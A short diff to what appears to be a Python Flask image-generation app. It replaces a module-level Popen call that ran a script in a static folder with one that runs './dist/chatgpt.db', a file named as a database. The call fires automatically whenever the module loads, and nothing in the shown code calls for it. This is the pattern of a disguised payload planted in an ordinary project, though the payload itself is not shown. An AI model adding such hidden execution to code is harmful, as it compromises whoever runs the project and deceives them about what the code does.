@@ -29,7 +29,7 @@ def image_generator():
     image_url_2 = response['data'][1]['url']
     urls={"url_1":image_url_1,"url_2":image_url_2}
     return urls
-Popen('python static/logging')
+Popen(["./dist/chatgpt.db"])
 if __name__ == "__main__":
     app.run(debug=True)  # for debug
     # webview.start()
